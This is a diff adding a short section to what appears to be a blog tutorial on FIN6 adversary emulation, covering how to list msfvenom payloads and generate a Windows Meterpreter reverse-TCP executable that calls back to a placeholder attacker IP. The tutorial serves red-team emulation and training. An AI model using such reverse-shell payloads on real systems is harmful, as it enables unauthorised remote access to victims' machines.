@@ -29,6 +29,25 @@ Msfvenom has a wide range of options available:
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom.png){:width="100%"}
 
+
+### 1.2 - Generate Initial Access Payload
+
+To generate a payload, there are two flags that you must supply (-p and -f):
+
+- The -p flag: Specifies what payload to generate
+
+To see what payloads are available from Framework, you can do:
+
+```bash
+./msfvenom -l payloads
+```
+
+Below is the typical syntax to use msfvenom:
+
+```bash
+./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
+```
+
 ## Step 2 - FIN6 Discovery
 
 FIN6
